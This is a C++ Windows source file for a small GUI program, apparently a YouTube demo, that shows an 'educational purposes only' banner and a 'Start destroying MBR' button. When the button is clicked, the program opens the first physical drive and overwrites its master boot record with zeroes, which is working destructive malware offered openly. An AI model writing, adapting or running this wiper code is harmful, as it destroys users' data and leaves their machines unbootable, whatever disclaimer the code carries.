#include "main.hpp"

int CALLBACK wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR szCmdLine, int nCmdShow) {
	MSG msg{};
	HWND hWnd{};
	WNDCLASSEX wc{ sizeof(WNDCLASSEX) };
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.lpszClassName = L"MBReater";
	hbrBackgroundBrush = CreateSolidBrush(RGB(255, 255, 255));
	wc.hbrBackground = hbrBackgroundBrush;
	wc.lpszMenuName = nullptr;

	wc.hCursor = LoadCursor(hInstance, IDC_ARROW);
	wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
	wc.hIconSm = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc = [](HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)->LRESULT {
		switch (uMsg) {
		case WM_CREATE: {
			//PlaySound(L"music.wav", 0, SND_FILENAME | SND_ASYNC | SND_LOOP | SND_NODEFAULT);
			HWND text1 = CreateWindow(L"STATIC", L"EDUCATIONAL PURPOSES ONLY\r\nUSE ONLY ON VM", WS_VISIBLE | WS_CHILD | SS_CENTER, 200, 50, 500, 100, hWnd, nullptr, nullptr, nullptr);
			HWND button1 = CreateWindow(L"BUTTON", L"SOURCE + SUBSCRIBE", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 225, 200, 300, 150, hWnd, (HMENU)1, nullptr, nullptr);
			HWND button2 = CreateWindow(L"BUTTON", L"Start destroying MBR", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 300, 400, 150, 50, hWnd, (HMENU)2, nullptr, nullptr);
			break;
		};
		case WM_COMMAND: {
			if (LOWORD(wParam) == 1) {
				ShellExecute(nullptr, L"open", L"https://github.com/Riffallr", nullptr, nullptr, SW_SHOWNORMAL);
				ShellExecute(nullptr, L"open", L"https://www.youtube.com/@RiffallRRR", nullptr, nullptr, SW_SHOWNORMAL);
			}
			if (LOWORD(wParam) == 2) {
				DeleteObject(hbrBackgroundBrush);
				hbrBackgroundBrush = CreateSolidBrush(RGB(10, 10, 10));
				SetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)hbrBackgroundBrush);
				InvalidateRect(hWnd, nullptr, TRUE);

				char mbr[MBR_SIZE];
				ZeroMemory(&mbr, (sizeof(mbr)));

				HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
				
				DWORD bytesWritten;
				BOOL writeResult = WriteFile(hFile, mbr, MBR_SIZE, &bytesWritten, NULL);
			}
			break;
		};
		case WM_DESTROY: {
			DeleteObject(hbrBackgroundBrush);
			PostQuitMessage(EXIT_SUCCESS);
			break;
		};
		}
		return DefWindowProc(hWnd, uMsg, wParam, lParam);
	};

	if (!RegisterClassEx(&wc)) {
		return EXIT_FAILURE;
	}

	if (hWnd = CreateWindow(wc.lpszClassName, L"Master Boot Record", WS_OVERLAPPEDWINDOW, 30, 30, 800, 600, nullptr, nullptr, wc.hInstance, nullptr); hWnd == INVALID_HANDLE_VALUE) {
		return EXIT_FAILURE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	while (GetMessage(&msg, nullptr, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return static_cast<int>(msg.wParam);
}